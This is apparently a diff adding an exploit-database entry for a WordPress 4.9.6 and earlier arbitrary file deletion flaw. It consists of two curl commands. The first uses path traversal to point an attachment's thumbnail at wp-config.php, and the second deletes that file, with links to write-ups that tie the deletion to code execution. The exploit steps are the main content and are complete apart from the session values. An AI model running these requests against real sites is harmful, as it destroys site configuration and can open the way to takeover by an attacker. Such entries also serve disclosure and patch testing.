@@ -1,0 +1,24 @@
+# Exploit Title: Wordpress <= 4.9.6 Arbitrary File Deletion Vulnerability
+# Date: 2018-06-27
+# Exploit Author: VulnSpy
+# Vendor Homepage: http://www.wordpress.org
+# Software Link: http://www.wordpress.org/download
+# Version: <= 4.9.6
+# Tested on: php7 mysql5
+# CVE :
+
+Step 1:
+
+```
+curl -v 'http://localhost/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php'
+```
+
+Step 2:
+
+```
+curl -v 'http://localhost/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'
+```
+
+REF:
+  Wordpress <= 4.9.6 Arbitrary File Deletion Vulnerability Exploit - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
+  WARNING: WordPress File Delete to Code Execution - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
